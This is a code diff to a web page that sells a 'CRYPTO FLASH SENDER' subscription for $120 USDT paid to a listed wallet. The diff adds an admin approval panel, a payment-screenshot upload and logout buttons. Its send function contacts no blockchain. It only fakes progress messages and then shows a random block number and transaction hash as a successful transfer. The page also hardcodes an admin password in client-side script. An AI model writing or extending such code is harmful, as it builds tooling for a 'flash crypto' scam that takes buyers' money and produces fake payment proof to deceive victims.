@@ -18,27 +18,61 @@
         button:hover { background-color: #f4a261; }
         .hidden { display: none; }
         .success { margin-top: 20px; font-weight: bold; }
+        .error { color: red; }
+        .copy-btn { margin-left: 10px; background-color: #f4a261; color: white; cursor: pointer; padding: 5px 10px; border-radius: 5px; }
+        .copy-btn:hover { background-color: #e94560; }
+        .approved-users-list { text-align: left; }
+        .approved-user { margin: 10px 0; padding: 5px; border: 1px solid #fff; border-radius: 5px; display: flex; justify-content: space-between; align-items: center; }
+        .remove-btn { background-color: #e94560; color: white; cursor: pointer; padding: 5px 10px; border-radius: 5px; }
+        .remove-btn:hover { background-color: #f4a261; }
     </style>
 </head>
 <body>
+    <!-- User Login Form -->
     <div id="login-container" class="container">
         <h2>Login to CRYPTO FLASH SENDER </h2>
         <p>USDT / BNB / ETH / SOLANA / BTC </p>
-              <p>Subscription : $120 USDT </P>
-              <p>Period : 7 days </P>
-              <p>USDT Limit : 20000 USDT</P>
-              <p> All other tokens limit mentioned in home page </p> 
+        <p>Subscription : $120 USDT </P>
+        <p>Period : 7 days </P>
+        <p>USDT Limit : 20000 USDT</P>
+        <p>All other tokens limit mentioned on the homepage</p> 
         <select id="user-type" onchange="handleUserSelection()">
             <option value="admin">Admin</option>
             <option value="user">User</option>
         </select>
         <input type="text" id="user-id" placeholder="User ID">
         <input type="password" id="password" placeholder="Password">
+        
+        <!-- Email and payment screenshot for user -->
+        <input type="email" id="email" placeholder="Email Address">
+        <input type="file" id="payment-screenshot" accept="image/*">
+        
         <p id="user-wallet" class="hidden">Wallet: 0xce055D5cE1EB3194f370E0773dFE9CE09a88445e (Only USDT ERC-20)</p>
+        
         <button onclick="login()">Login</button>
-        <p id="login-error" style="color: red; display: none;">Invalid Credentials!</p>
+        
+        <button onclick="submitDetails()" class="hidden" id="submit-details-btn">Submit Details</button>
+        
+        <p id="login-error" class="error" style="display: none;">Invalid Credentials!</p>
     </div>
 
+    <!-- Admin Approval Section -->
+    <div id="admin-approval-container" class="container hidden">
+        <h2>Admin Approval</h2>
+        <p>Review and approve the users who have submitted their details for registration.</p>
+        <div id="user-submission-list"></div>
+
+        <h3>Approved Users</h3>
+        <div id="approved-users-list" class="approved-users-list"></div>
+
+        <button onclick="approveUser()">Approve Selected User</button>
+        <button onclick="rejectUser()">Reject Selected User</button>
+
+        <!-- Logout Button for Admin -->
+        <button onclick="logout('admin')" style="margin-top: 20px;">Logout</button>
+    </div>
+
+    <!-- Main User Panel -->
     <div id="main-container" class="container hidden">
         <h2>FLASH Sender</h2>
         <label>Select Network:</label>
@@ -64,20 +98,46 @@
 
         <button onclick="sendToken()">Send</button>
         <p id="transaction-status" class="success hidden"></p>
+
+        <!-- Logout Button for User -->
+        <button onclick="logout('user')" style="margin-top: 20px;">Logout</button>
     </div>
 
     <script>
+        let userDetails = {};  // Store user submissions for admin approval
+        let approvedUsers = {}; // Store approved users
+
+        const tokens = {
+            "ERC20": ["Ethereum (ETH)", "Tether USD (USDT)"],
+            "TRC20": ["Tron (TRX)", "Tether USD (USDT)"],
+            "BEP20": ["Binance Coin (BNB)", "Tether USD (USDT)"],
+            "BTC": ["Bitcoin (BTC)", "Wrapped Bitcoin (WBTC)"],
+            "SOLANA": ["Solana (SOL)", "Tether USD (USDT)"]
+        };
+
         function handleUserSelection() {
             let userType = document.getElementById("user-type").value;
             let walletInfo = document.getElementById("user-wallet");
             walletInfo.classList.toggle("hidden", userType !== "user");
+            
+            // Show submit button if it's a user
+            let submitBtn = document.getElementById("submit-details-btn");
+            submitBtn.classList.toggle("hidden", userType !== "user");
         }
 
         function login() {
             let userType = document.getElementById("user-type").value;
             let userId = document.getElementById("user-id").value;
             let password = document.getElementById("password").value;
-            if ((userType === "admin" && userId === "Flash" && password === "Nilan@101088") || (userType === "user" && userId && password)) {
+
+            // Default Admin Credentials
+            const adminId = "Admin";
+            const adminPassword = "Nilan@101088";
+
+            if (userType === "admin" && userId === adminId && password === adminPassword) {
+                document.getElementById("login-container").classList.add("hidden");
+                document.getElementById("admin-approval-container").classList.remove("hidden");
+            } else if (userType === "user" && userId && password && userDetails[userId] && userDetails[userId].approved) {
                 document.getElementById("login-container").classList.add("hidden");
                 document.getElementById("main-container").classList.remove("hidden");
             } else {
@@ -85,22 +145,165 @@
             }
         }
 
+        function logout(userType) {
+            // Reset all panels and show login page again
+            document.getElementById("login-container").classList.remove("hidden");
+            document.getElementById("admin-approval-container").classList.add("hidden");
+            document.getElementById("main-container").classList.add("hidden");
+
+            // Reset form fields
+            document.getElementById("user-id").value = "";
+            document.getElementById("password").value = "";
+            document.getElementById("email").value = "";
+            document.getElementById("payment-screenshot").value = "";
+
+            // Clear error message
+            document.getElementById("login-error").style.display = "none";
+        }
+
+        function submitDetails() {
+            let email = document.getElementById("email").value;
+            let screenshot = document.getElementById("payment-screenshot").files[0];
+
+            if (!email || !screenshot) {
+                alert("Please enter your email and upload the payment screenshot.");
+                return;
+            }
+
+            // Store the user submission for admin approval
+            let userId = generateUserId();
+            userDetails[userId] = { email: email, screenshot: screenshot, approved: false };
+            alert(`Details submitted. Please wait for admin approval. Your User ID: ${userId}`);
+            
+            // Display user details in the admin approval section
+            displayUserSubmissionList();
+
+            document.getElementById("email").value = "";
+            document.getElementById("payment-screenshot").value = "";
+        }
+
+        function generateUserId() {
+            return 'user' + Math.floor(Math.random() * 10000);  // Example: Generate a user ID
+        }
+
+        function displayUserSubmissionList() {
+            const userSubmissionList = document.getElementById("user-submission-list");
+            userSubmissionList.innerHTML = ''; // Clear previous list
+            for (let userId in userDetails) {
+                if (!userDetails[userId].approved) {
+                    let userDiv = document.createElement('div');
+                    userDiv.innerHTML = `User ID: ${userId} | Email: ${userDetails[userId].email}`;
+                    userSubmissionList.appendChild(userDiv);
+                }
+            }
+        }
+
+        function generateRandomPassword() {
+            const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*";
+            let password = '';
+            for (let i = 0; i < 12; i++) {
+                password += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return password;
+        }
+
+        function approveUser() {
+            // Admin approves a user submission
+            let selectedUserId = prompt("Enter the User ID to approve:");
+            if (userDetails[selectedUserId]) {
+                // Get the user details
+                let user = userDetails[selectedUserId];
+                userDetails[selectedUserId].approved = true;
+
+                // Generate random user credentials
+                let randomPassword = generateRandomPassword();
+
+                // Save to approved users
+                approvedUsers[selectedUserId] = {
+                    email: user.email,
+                    password: randomPassword
+                };
+
+                // Display the approved user list
+                displayApprovedUserList();
+
+                // Log and display the approval details
+                alert(`User Details Approved:\nUser ID: ${selectedUserId}\nEmail: ${user.email}\nGenerated Credentials:\nUser ID: ${selectedUserId}\nPassword: ${randomPassword}`);
+                
+                // Refresh the admin approval list
+                displayUserSubmissionList();
+            } else {
+                alert("User not found!");
+            }
+        }
+
+        function rejectUser() {
+            // Admin rejects a user submission
+            let selectedUserId = prompt("Enter the User ID to reject:");
+            if (userDetails[selectedUserId]) {
+                delete userDetails[selectedUserId];
+                alert(`User ${selectedUserId} rejected!`);
+                displayUserSubmissionList();
+            } else {
+                alert("User not found!");
+            }
+        }
+
+        function displayApprovedUserList() {
+            const approvedUserList = document.getElementById("approved-users-list");
+            approvedUserList.innerHTML = ''; // Clear previous list
+            for (let userId in approvedUsers) {
+                let userDiv = document.createElement('div');
+                userDiv.classList.add('approved-user');
+                userDiv.innerHTML = `
+                    User ID: ${userId} | Email: ${approvedUsers[userId].email} | 
+                    Credentials: User ID: ${userId}, Password: ${approvedUsers[userId].password}
+                    <button class="remove-btn" onclick="removeApprovedUser('${userId}')">Remove</button>
+                `;
+                approvedUserList.appendChild(userDiv);
+            }
+        }
+
+        function removeApprovedUser(userId) {
+            delete approvedUsers[userId];
+            alert(`User ${userId} removed from approved list!`);
+            displayApprovedUserList();
+        }
+
         function updateTokens() {
             let network = document.getElementById("network").value;
             let tokenSelect = document.getElementById("token");
-            let tokens = {
-                "ERC20": ["Ethereum (ETH)", "Tether USD (USDT)"],
-                "TRC20": ["Tron (TRX)", "Tether USD (USDT)"],
-                "BEP20": ["Binance Coin (BNB)", "Tether USD (USDT)"],
-                "BTC": ["Bitcoin (BTC)", "Wrapped Bitcoin (WBTC)"],
-                "SOLANA": ["Solana (SOL)", "Tether USD (USDT)"]
-            };
-            tokenSelect.innerHTML = "";
-            tokens[network].forEach(token => {
-                let option = document.createElement("option");
-                option.text = token;
-                tokenSelect.add(option);
-            });
+
+            // Clear current token options
+            tokenSelect.innerHTML = "<option value='' disabled selected>Select a Token</option>";
+
+            if (network && tokens[network]) {
+                tokens[network].forEach(token => {
+                    let option = document.createElement("option");
+                    option.value = token;
+                    option.textContent = token;
+                    tokenSelect.appendChild(option);
+                });
+            }
+        }
+
+        function sendToken() {
+            let network = document.getElementById("network").value;
+            let token = document.getElementById("token").value;
+            let address = document.getElementById("address").value;
+            let quantity = document.getElementById("quantity").value;
+            let statusMsg = document.getElementById("transaction-status");
+
+            if (!network || !token || !address || quantity === "") {
+                alert("Please fill all details before sending!");
+                return;
+            }
+
+            statusMsg.classList.remove("hidden");
+            statusMsg.innerHTML = "🔄 Connecting to Server...";
+            setTimeout(() => { statusMsg.innerHTML = "⏳ Processing Transaction..."; }, 2000);
+            setTimeout(() => { let blockNumber = generateRandomBlock(); statusMsg.innerHTML = `✅ Block Confirmation: #${blockNumber}`; }, 4000);
+            setTimeout(() => { let txHash = generateTransactionHash(); statusMsg.innerHTML = `✅ Transferred Successfully!<br>Transaction Hash: <br>${txHash}`; }, 6000);
         }
 
         function generateTransactionHash() {
@@ -114,23 +317,6 @@
 
         function generateRandomBlock() {
             return Math.floor(100000 + Math.random() * 900000);
-        }
-
-        function sendToken() {
-            let network = document.getElementById("network").value;
-            let token = document.getElementById("token").value;
-            let address = document.getElementById("address").value;
-            let quantity = document.getElementById("quantity").value;
-            let statusMsg = document.getElementById("transaction-status");
-            if (!network || !token || !address || quantity === "") {
-                alert("Please fill all details before sending!");
-                return;
-            }
-            statusMsg.classList.remove("hidden");
-            statusMsg.innerHTML = "🔄 Connecting to Server...";
-            setTimeout(() => { statusMsg.innerHTML = "⏳ Processing Transaction..."; }, 2000);
-            setTimeout(() => { let blockNumber = generateRandomBlock(); statusMsg.innerHTML = `✅ Block Confirmation: #${blockNumber}`; }, 4000);
-            setTimeout(() => { let txHash = generateTransactionHash(); statusMsg.innerHTML = `✅ Transferred Successfully!<br>Transaction Hash: <br>${txHash}`; }, 6000);
         }
     </script>
 </body>
